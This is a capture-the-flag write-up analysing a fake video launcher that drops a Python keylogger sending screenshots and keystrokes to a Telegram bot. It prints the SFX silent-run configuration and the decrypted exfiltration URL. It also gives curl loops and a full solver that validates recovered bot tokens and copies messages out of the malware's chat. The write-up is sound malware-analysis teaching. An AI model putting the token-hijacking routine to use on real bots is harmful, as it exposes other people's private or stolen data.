---
title: "VideoLauncher"
summary: "UMCS Preliminary umcs preliminary, forensics, reverse engineering writeup covering VideoLauncher with analysis, solution steps, and final recovery notes."
date: 2026-04-26
tags:
  - ctf
  - umcs-preliminary
  - forensics
  - reverse-engineering
  - malware-analysis
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://umcybersec.site/assets/logo-BsYk-M08.png"
---
# Challenge Overview

**Challenge Name:** VideoLauncher
**Category:** Reverse / Malware Analysis / Forensics
**Points:** 310
**Flag Format:** `UMCS{}`
**Provided File:** `VideoLauncher.7z`
**Archive Password:[REDACTED_PASSWORD]infected`

The challenge provided a suspicious archive named `VideoLauncher.7z`. The scenario stated that a student clicked a video launcher and the machine started behaving strangely. The goal was to safely analyze the malware chain, recover its command-and-control configuration, and obtain the final flag.

The final flag was recovered from Telegram bot messages:

```text
UMCS{sFx_KeY1o0Gg3R_T3l3gRam_B0t}
```

The captured Telegram output shows the flag in message IDs `21` and `48`.

---

# Initial Analysis

The analysis was performed statically first, without executing the malware.

The starting directory contained only the challenge archive:

```bash
ls
```

Output:

```text
VideoLauncher.7z
```

The archive was password-protected. Using the provided password, it extracted into a Windows executable:

```bash
mkdir -p outer
7z x VideoLauncher.7z -pinfected -oouter

file outer/*
```

Output:

```text
outer/VideoLauncher.exe: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 8 sections
```

The file looked like a Windows executable, but extracting it with `unrar` revealed that it was actually a **WinRAR SFX self-extracting archive**:

```bash
mkdir -p sfx_extract
unrar x outer/VideoLauncher.exe sfx_extract/
```

The SFX archive comment revealed its execution behavior:

```text
Setup=chilllll.mp4
Setup=WinSystemUpdate.exe
TempMode
Silent=1
Overwrite=1
```

This means the launcher silently extracts and runs two files:

```text
chilllll.mp4
WinSystemUpdate.exe
```

The extracted files were:

```bash
file sfx_extract/*
```

Output:

```text
sfx_extract/chilllll.mp4:        ISO Media, MP4 v2 [ISO 14496-14]
sfx_extract/WinSystemUpdate.exe: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections
```

The MP4 was likely a decoy video, while `WinSystemUpdate.exe` was the real payload.

Next, `WinSystemUpdate.exe` was extracted using `pyinstxtractor.py`:

```bash
python3 pyinstxtractor.py sfx_extract/WinSystemUpdate.exe
```

The extractor identified it as a PyInstaller package:

```text
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Possible entry point: keylog.pyc
```

The important extracted file was:

```text
WinSystemUpdate.exe_extracted/keylog.pyc
```

This indicated that the malware was a Python-based payload packaged with PyInstaller.

---

# Vulnerability / Weakness Identification

The weakness was that the malware stored its Telegram bot configuration inside the client-side binary.

Although the sensitive values were encrypted with Fernet, the Fernet key was also stored inside the same `keylog.pyc` file. This made the encryption ineffective for protection, because anyone who extracted the PyInstaller package could recover both:

```text
1. Fernet key
2. Encrypted Telegram configuration blobs
```

After decrypting the constants, the following values were recovered:

```text
CHAT_ID:
1421332625

Primary bot token:
[REDACTED_TOKEN]

Fallback bot tokens:
[REDACTED_TOKEN]
[REDACTED_TOKEN]
[REDACTED_TOKEN]
[REDACTED_TOKEN]
```

The recovered malware URL used Telegram’s `sendPhoto` endpoint:

```text
https://api.telegram.org/bot<TOKEN>/sendPhoto
```

This showed that the malware behaved like a screenshot/keylogger exfiltrator. It took screenshots or keylogs and sent them to a Telegram chat controlled by the bot.

The challenge was solvable because the Telegram bot tokens were valid, and the bot had access to the source chat ID. By using the Telegram Bot API, old messages from the chat could be copied or forwarded into our own Telegram chat and inspected.

---

# Exploitation Strategy

The full exploitation strategy was:

```text
1. Extract VideoLauncher.7z using the password infected.
2. Extract VideoLauncher.exe as a WinRAR SFX archive.
3. Identify WinSystemUpdate.exe as the real payload.
4. Extract WinSystemUpdate.exe with pyinstxtractor.py.
5. Load keylog.pyc and recover byte constants.
6. Identify the Fernet key and encrypted Fernet tokens.
7. Decrypt the Telegram bot URL and chat ID.
8. Extract primary and fallback Telegram bot tokens.
9. Validate all bot tokens using getMe.
10. Use the valid bot token and source chat ID to copy or forward messages.
11. Recover the flag from the copied Telegram messages.
```

The most reliable exploitation method was to use Telegram’s `copyMessage` or `forwardMessage` API method to retrieve messages from the source chat.

Manual testing confirmed that the primary bot could access the victim/source chat and copy messages into the attacker-controlled chat. The copied messages included IDs `1–56`, `64–76`, and `91`.

---

# Proof of Concept

## 1. Extract the 7z archive

```bash
cd ~/Desktop/'UMCS Prelim'/VideoLauncher

mkdir -p outer
7z x VideoLauncher.7z -pinfected -oouter
file outer/*
```

Expected output:

```text
outer/VideoLauncher.exe: PE32+ executable for MS Windows 6.00 (GUI), x86-64
```

## 2. Extract the WinRAR SFX

```bash
mkdir -p sfx_extract
unrar x outer/VideoLauncher.exe sfx_extract/
ls -lah sfx_extract
file sfx_extract/*
```

Expected files:

```text
chilllll.mp4
WinSystemUpdate.exe
```

The SFX script showed:

```text
Setup=chilllll.mp4
Setup=WinSystemUpdate.exe
TempMode
Silent=1
Overwrite=1
```

This confirmed that the video was a decoy and `WinSystemUpdate.exe` was executed silently.

## 3. Extract PyInstaller payload

```bash
wget -O pyinstxtractor.py https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py

python3 pyinstxtractor.py sfx_extract/WinSystemUpdate.exe
find . -maxdepth 3 -type f -name 'keylog.pyc' -print
```

Expected output:

```text
./WinSystemUpdate.exe_extracted/keylog.pyc
```

## 4. Decrypt Telegram configuration

A small Python script was used to load `keylog.pyc`, walk through the code constants, extract Fernet keys and encrypted blobs, then decrypt them.

Important recovered output:

```text
[FERNET_KEY] [REDACTED_TOKEN]
[DECRYPTED] 1421332625
[DECRYPTED] https://api.telegram.org/bot[REDACTED_TOKEN]/sendPhoto
[DECRYPTED] If the above bot token is not working pls try other bot token provided here : [REDACTED_TOKEN] ,[REDACTED_TOKEN] , [REDACTED_TOKEN] , [REDACTED_TOKEN]
```

## 5. Validate the tokens

```bash
TOKENS=(
'[REDACTED_TOKEN]'
'[REDACTED_TOKEN]'
'[REDACTED_TOKEN]'
'[REDACTED_TOKEN]'
'[REDACTED_TOKEN]'
)

for t in "${TOKENS[@]}"; do
  echo "===== $t ====="
  curl -s "https://api.telegram.org/bot$t/getMe" | jq .
done
```

All five tokens returned `"ok": true`, confirming that the bot tokens were valid.

## 6. Copy messages from the source chat

The recovered source chat ID was:

```text
1421332625
```

My Telegram chat ID was retrieved using `getUpdates` after sending `/start` to the bot:

```bash
BOT_AUTH='[redacted-bot-auth-value]'

curl -s "https://api.telegram.org/bot$BOT_AUTH/getUpdates?offset=-100&limit=100" \
| jq -r '.result[] | .message.chat.id? // .edited_message.chat.id? // empty' \
| sort -u
```

Output:

```text
8574172934
```

Then messages were copied from the source chat:

```bash
BOT_AUTH='[redacted-bot-auth-value]'
SRC_CHAT='1421332625'
MY_CHAT='8574172934'

for id in $(seq 1 100); do
  r=$(curl -s -X POST "https://api.telegram.org/bot$BOT_AUTH/copyMessage" \
    -d "chat_id=$MY_CHAT" \
    -d "from_chat_id=$SRC_CHAT" \
    -d "message_id=$id")

  if echo "$r" | jq -e '.ok == true' >/dev/null; then
    echo "[+] copied message_id=$id"
  fi

  sleep 0.03
done
```

This successfully copied multiple messages from the bot-accessible source chat.

The captured messages contained:

```text
here is the flag:
UMCS{sFx_KeY1o0Gg3R_T3l3gRam_B0t}
```

The flag was present in message IDs `21` and `48`.

---

# Full Python Solver

The following solver automates the main process:

```python
#!/usr/bin/env python3
"""
VideoLauncher CTF Solver

This script:
1. Extracts VideoLauncher.7z.
2. Extracts the WinRAR SFX payload.
3. Extracts the PyInstaller payload using pyinstxtractor.py.
4. Parses keylog.pyc.
5. Decrypts Fernet-protected Telegram configuration.
6. Tests recovered Telegram bot tokens.
7. Optionally forwards messages from the recovered source chat to your Telegram chat.
8. Searches forwarded message responses for the UMCS{} flag.

Requirements:
- 7z
- unrar
- pyinstxtractor.py
- Python 3.13 recommended, because the payload pyc is Python 3.13
- pip packages: cryptography requests
"""

import argparse
import marshal
import os
import re
import shutil
import subprocess
import sys
import time
import types
from pathlib import Path

import requests
from cryptography.fernet import Fernet


FLAG_RE = re.compile(r"UMCS\{[^}]+\}|umcs\{[^}]+\}")


def run(cmd, cwd=None):
    """Run a shell command and stop if it fails."""
    print(f"[CMD] {' '.join(map(str, cmd))}")
    subprocess.run(cmd, cwd=cwd, check=True)


def extract_7z(archive: Path, password: str, out_dir: Path) -> Path:
    """Extract the outer password-protected 7z archive."""
    out_dir.mkdir(exist_ok=True)

    run([
        "7z",
        "x",
        str(archive),
        f"-p{password}",
        f"-o{out_dir}",
        "-y",
    ])

    exe = out_dir / "VideoLauncher.exe"
    if not exe.exists():
        raise FileNotFoundError("VideoLauncher.exe was not found after 7z extraction.")

    print(f"[+] Extracted outer executable: {exe}")
    return exe


def extract_sfx_with_unrar(sfx_exe: Path, out_dir: Path) -> Path:
    """Extract the WinRAR SFX archive."""
    out_dir.mkdir(exist_ok=True)

    run(["unrar", "x", "-o+", str(sfx_exe), str(out_dir)])

    payload = out_dir / "WinSystemUpdate.exe"
    if not payload.exists():
        raise FileNotFoundError("WinSystemUpdate.exe was not found after SFX extraction.")

    print(f"[+] Extracted malware payload: {payload}")
    return payload


def extract_pyinstaller(payload_exe: Path, pyinstxtractor: Path, work_dir: Path) -> Path:
    """
    Extract the PyInstaller executable using pyinstxtractor.py.

    The extracted directory is normally named:
    WinSystemUpdate.exe_extracted
    """
    if not pyinstxtractor.exists():
        raise FileNotFoundError(
            f"Missing {pyinstxtractor}. Download pyinstxtractor.py first."
        )

    run([sys.executable, str(pyinstxtractor), str(payload_exe)], cwd=work_dir)

    extracted_dir = work_dir / "WinSystemUpdate.exe_extracted"
    keylog = extracted_dir / "keylog.pyc"

    if not keylog.exists():
        matches = list(work_dir.rglob("keylog.pyc"))
        if not matches:
            raise FileNotFoundError("keylog.pyc was not found after PyInstaller extraction.")
        keylog = matches[0]
        extracted_dir = keylog.parent

    print(f"[+] Found keylog.pyc: {keylog}")
    return keylog


def load_pyc_code(pyc_path: Path):
    """
    Load a .pyc code object.

    PyInstaller entry-point pyc files may be raw marshal data or may include
    a normal pyc header. Try common offsets.
    """
    data = pyc_path.read_bytes()

    for offset in (0, 12, 16):
        try:
            code = marshal.loads(data[offset:])
            print(f"[+] Loaded pyc using marshal offset {offset}")
            return code
        except Exception:
            pass

    raise RuntimeError(
        "Could not load keylog.pyc. Use the same Python major/minor version as the payload."
    )


def walk_code_objects(code):
    """Recursively walk nested Python code objects."""
    yield code

    for const in code.co_consts:
        if isinstance(const, types.CodeType):
            yield from walk_code_objects(const)


def decrypt_config(keylog_pyc: Path):
    """
    Extract Fernet key and encrypted blobs from keylog.pyc, then decrypt them.

    Returns:
    - chat_ids: list[str]
    - tokens: list[str]
    - decrypted_values: list[str]
    """
    code = load_pyc_code(keylog_pyc)

    blobs = []
    for c in walk_code_objects(code):
        for const in c.co_consts:
            if isinstance(const, bytes):
                blobs.append(const)

    fernet_keys = [
        b for b in blobs
        if re.fullmatch(rb"[A-Za-z0-9_-]{43}=", b)
    ]

    encrypted_blobs = [
        b for b in blobs
        if b.startswith(b"gAAAA")
    ]

    print(f"[+] Fernet keys found: {len(fernet_keys)}")
    print(f"[+] Encrypted blobs found: {len(encrypted_blobs)}")

    decrypted_values = []
    tokens = []
    chat_ids = []

    for key in fernet_keys:
        print(f"[FERNET_KEY] {key.decode()}")
        f = Fernet(key)

        for blob in encrypted_blobs:
            try:
                value = f.decrypt(blob).decode()
            except Exception:
                continue

            print(f"[DECRYPTED] {value}")
            decrypted_values.append(value)

            # Extract bot tokens from URLs or fallback text.
            for token in re.findall(r"\b\d{8,12}:AA[A-Za-z0-9_-]{30,}\b", value):
                if token not in tokens:
                    tokens.append(token)

            # Extract chat ID.
            if value.isdigit() and value not in chat_ids:
                chat_ids.append(value)

    return chat_ids, tokens, decrypted_values


def test_tokens(tokens):
    """Validate bot tokens with getMe."""
    valid = []

    for token in tokens:
        url = f"https://api.telegram.org/bot{token}/getMe"
        try:
            r = requests.get(url, timeout=15)
            data = r.json()
        except Exception as e:
            print(f"[-] Token test failed for {token}: {e}")
            continue

        if data.get("ok"):
            username = data["result"].get("username")
            print(f"[+] Valid token: {token} -> @{username}")
            valid.append(token)
        else:
            print(f"[-] Invalid token: {token} -> {data}")

    return valid


def get_updates_chat_ids(token):
    """Show possible chat IDs from getUpdates."""
    url = f"https://api.telegram.org/bot{token}/getUpdates"
    params = {"offset": -100, "limit": 100}

    r = requests.get(url, params=params, timeout=15)
    data = r.json()

    ids = set()
    for item in data.get("result", []):
        for key in ("message", "edited_message"):
            msg = item.get(key)
            if msg and "chat" in msg:
                ids.add(str(msg["chat"]["id"]))

    return sorted(ids)


def forward_messages_and_find_flag(token, src_chat, my_chat, start_id, end_id, delay):
    """
    Forward messages from the recovered source chat to our own chat.

    forwardMessage returns the forwarded Message object, so we can inspect
    text/caption directly from the API response.
    """
    base = f"https://api.telegram.org/bot{token}"
    out_dir = Path("forwarded_json")
    out_dir.mkdir(exist_ok=True)

    for msg_id in range(start_id, end_id + 1):
        r = requests.post(
            f"{base}/forwardMessage",
            data={
                "chat_id": my_chat,
                "from_chat_id": src_chat,
                "message_id": msg_id,
            },
            timeout=20,
        )

        try:
            data = r.json()
        except Exception:
            print(f"[-] Non-JSON response for message_id={msg_id}: {r.text[:120]}")
            continue

        if not data.get("ok"):
            time.sleep(delay)
            continue

        print(f"[+] Forwarded message_id={msg_id}")

        json_path = out_dir / f"msg_{msg_id}.json"
        json_path.write_text(r.text, encoding="utf-8")

        result = data.get("result", {})
        candidates = []

        for field in ("text", "caption"):
            if field in result:
                candidates.append(result[field])

        raw = r.text
        candidates.append(raw)

        for text in candidates:
            match = FLAG_RE.search(text)
            if match:
                flag = match.group(0)
                print(f"[+] FLAG FOUND in message_id={msg_id}: {flag}")
                return flag

        time.sleep(delay)

    print("[-] No flag found in forwarded message range.")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="Solve the VideoLauncher malware CTF challenge."
    )

    parser.add_argument(
        "--archive",
        default="VideoLauncher.7z",
        help="Path to VideoLauncher.7z",
    )

    parser.add_argument(
        "--password",
        default="infected",
        help="7z archive password",
    )

    parser.add_argument(
        "--pyinstxtractor",
        default="pyinstxtractor.py",
        help="Path to pyinstxtractor.py",
    )

    parser.add_argument(
        "--my-chat",
        default=None,
        help="Your Telegram chat ID. Required for forwarding messages.",
    )

    parser.add_argument(
        "--start-id",
        type=int,
        default=1,
        help="First Telegram message ID to test",
    )

    parser.add_argument(
        "--end-id",
        type=int,
        default=100,
        help="Last Telegram message ID to test",
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Delay between Telegram API requests",
    )

    args = parser.parse_args()

    archive = Path(args.archive).resolve()
    pyinstxtractor = Path(args.pyinstxtractor).resolve()
    work_dir = archive.parent

    if not archive.exists():
        raise FileNotFoundError(f"Archive not found: {archive}")

    outer_dir = work_dir / "outer"
    sfx_dir = work_dir / "sfx_extract"

    # Extract chain.
    sfx_exe = extract_7z(archive, args.password, outer_dir)
    payload_exe = extract_sfx_with_unrar(sfx_exe, sfx_dir)
    keylog_pyc = extract_pyinstaller(payload_exe, pyinstxtractor, work_dir)

    # Decrypt config.
    chat_ids, tokens, _ = decrypt_config(keylog_pyc)

    if not chat_ids:
        raise RuntimeError("No chat ID recovered.")

    if not tokens:
        raise RuntimeError("No Telegram bot tokens recovered.")

    src_chat = chat_ids[0]
    print(f"[+] Source chat ID: {src_chat}")

    # Validate tokens.
    valid_tokens = test_tokens(tokens)

    if not valid_tokens:
        raise RuntimeError("No valid Telegram bot tokens found.")

    token = valid_tokens[0]
    print(f"[+] Using token: {token}")

    # If user did not provide my-chat, show available update chat IDs.
    if not args.my_chat:
        print()
        print("[!] No --my-chat provided.")
        print("[!] Send /start to the bot in Telegram, then rerun with --my-chat.")
        print("[*] Candidate chat IDs from getUpdates:")

        for cid in get_updates_chat_ids(token):
            print(f"    {cid}")

        print()
        print("Example:")
        print(
            f"python3 {Path(__file__).name} "
            f"--archive {archive.name} "
            f"--pyinstxtractor {pyinstxtractor.name} "
            f"--my-chat YOUR_CHAT_ID"
        )
        return

    # Forward messages and search for flag.
    flag = forward_messages_and_find_flag(
        token=token,
        src_chat=src_chat,
        my_chat=args.my_chat,
        start_id=args.start_id,
        end_id=args.end_id,
        delay=args.delay,
    )

    if flag:
        print()
        print(f"[FINAL FLAG] {flag}")
    else:
        print()
        print("[-] Flag not found. Increase --end-id, for example --end-id 1000.")


if __name__ == "__main__":
    main()
```

---

# Walkthrough

## 1. Prepare dependencies

On Kali, install system tools:

```bash
sudo apt update
sudo apt install -y 7zip unrar jq curl file python3-venv
```

Create a Python virtual environment:

```bash
python3 -m venv venv
source venv/bin/activate
pip install cryptography requests
```

Download `pyinstxtractor.py`:

```bash
wget -O pyinstxtractor.py https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py
```

Save the solver as:

```text
solve_videolauncher.py
```

## 2. First run: recover tokens and chat ID

Run:

```bash
python3 solve_videolauncher.py \
  --archive VideoLauncher.7z \
  --password [REDACTED_PASSWORD] \
  --pyinstxtractor pyinstxtractor.py
```

Expected important output:

```text
[+] Extracted outer executable: outer/VideoLauncher.exe
[+] Extracted malware payload: sfx_extract/WinSystemUpdate.exe
[+] Found keylog.pyc: WinSystemUpdate.exe_extracted/keylog.pyc
[FERNET_KEY] [REDACTED_TOKEN]
[DECRYPTED] 1421332625
[DECRYPTED] https://api.telegram.org/bot[REDACTED_TOKEN]/sendPhoto
[+] Valid token: ... -> @NPC_UMCS_bot
```

If `--my-chat` is not provided, the script prints candidate chat IDs from `getUpdates`.

## 3. Get your Telegram chat ID

Send `/start` to the bot:

```text
@NPC_UMCS_bot
```

Then run:

```bash
python3 solve_videolauncher.py \
  --archive VideoLauncher.7z \
  --password [REDACTED_PASSWORD] \
  --pyinstxtractor pyinstxtractor.py
```

The script should show your chat ID from `getUpdates`.

In the solved run, the chat ID was:

```text
8574172934
```

## 4. Run the full solve

```bash
python3 solve_videolauncher.py \
  --archive VideoLauncher.7z \
  --password [REDACTED_PASSWORD] \
  --pyinstxtractor pyinstxtractor.py \
  --my-chat 8574172934 \
  --start-id 1 \
  --end-id 100
```

Expected output:

```text
[+] Forwarded message_id=21
[+] FLAG FOUND in message_id=21: UMCS{sFx_KeY1o0Gg3R_T3l3gRam_B0t}

[FINAL FLAG] UMCS{sFx_KeY1o0Gg3R_T3l3gRam_B0t}
```

## Troubleshooting Notes

If Python fails to load `keylog.pyc`, use Python 3.13 because the PyInstaller payload was built with Python 3.13.

If Telegram returns:

```json
{"ok":false,"error_code":401,"description":"Unauthorized"}
```

that token is invalid or revoked. In this challenge, the malware contained fallback tokens, so the solver checks all recovered tokens.

If no flag is found in the first 100 message IDs, increase the range:

```bash
--end-id 1000
```

If `copyMessage` works but `forwardMessage` does not show content in the terminal, check your Telegram chat manually and search for:

```text
UMCS
flag
```

---

# Flag

The recovered flag is:

```text
UMCS{sFx_KeY1o0Gg3R_T3l3gRam_B0t}
```

It was recovered from Telegram messages copied or forwarded from source chat ID `1421332625`. The captured output shows the flag at message IDs `21` and `48`.

---

# Conclusion

The challenge was a malware-analysis task involving a fake video launcher.

The execution chain was:

```text
VideoLauncher.7z
→ VideoLauncher.exe
→ WinRAR SFX
→ chilllll.mp4
→ WinSystemUpdate.exe
→ PyInstaller Python payload
→ keylog.pyc
→ Fernet-encrypted Telegram configuration
→ Telegram bot messages
→ flag
```

The root cause was poor secret protection. The malware encrypted its Telegram configuration with Fernet, but stored the Fernet key in the same Python bytecode file. Once the PyInstaller package was extracted, the key and encrypted values could be recovered offline.

The key lesson is that encryption does not protect secrets if the decryption key is shipped with the client. In malware analysis and CTF reversing, encrypted strings are often recoverable when the binary contains both the ciphertext and the key.
